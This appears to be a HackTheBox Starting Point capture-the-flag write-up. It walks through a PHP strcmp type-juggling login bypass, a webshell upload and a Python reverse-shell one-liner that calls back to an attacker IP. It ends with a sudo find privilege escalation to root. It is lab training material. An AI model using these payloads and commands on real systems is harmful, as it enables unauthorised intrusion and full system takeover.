
This box is part of HackTheBox Starting point series. 

#HTB 

It is rated as very easy 

It includes the topics #privilege_escalation #directorty_enumeration and #php_type_juggling

When we first spawn the box we are met with a site with limited functionality. The site appears to be for a file upload service. It is locked behind a login page. 

The url for the login page is /login/login.php 

after navigating to /login we see there are a few other files we see `login.php.swp` this code contains some functionality of the login page 

```
if (strcmp($password, $_POST['password']) == 0) {    if (strcmp($username, $_POST['username']) == 0) {    require('config.php');if (!empty($_POST['username']) && !empty($_POST['password'])) {session_start();<?phpad</html></body>  <script src="../assets/js/main.js"></script
```
The strcmp() function is a php function that will evalutate and compare a string however if we pass it an array it will return null. 

To do this we use burp and its built in proxy to send a malicious request that will let us login and get an admin session

```
Connection: keep-alive

username=admin&password[]=
```

This evaluates correctly and we login 

Now we are at a /uploads and have the ability to upload files - we upload a test file

We do a directory scan to try and find where the upload went 
`sudo gobuster dir -u http://10.129.95.184/ -w /usr/share/wordlists/dirb/big.txt`

this scan finds the directory `_uploaded`

navigating to the directory we see our uploaded file.

Now we upload a php webshell and open it. This works. We see we have python installed using `which python` so we use that to spawn a reverse shell 

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.92",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

Now that we have a shell we see we are www-data

we enumerate the /www/login directory and find the other file we saw at first. `config.php`
this contains a user/pass combo. admin:thisisagoodpassword we also enumerate the users and see the john users in the user directory

We use that the password combo to ssh as john. 

now that we are john we see that john has some sudo perms using sudo -l 

we see that he can run find. Priv esc is now trivial as we can use GTFO bins 

```
find . -exec /bin/sh \; -quit
```

we are root. Box Pwned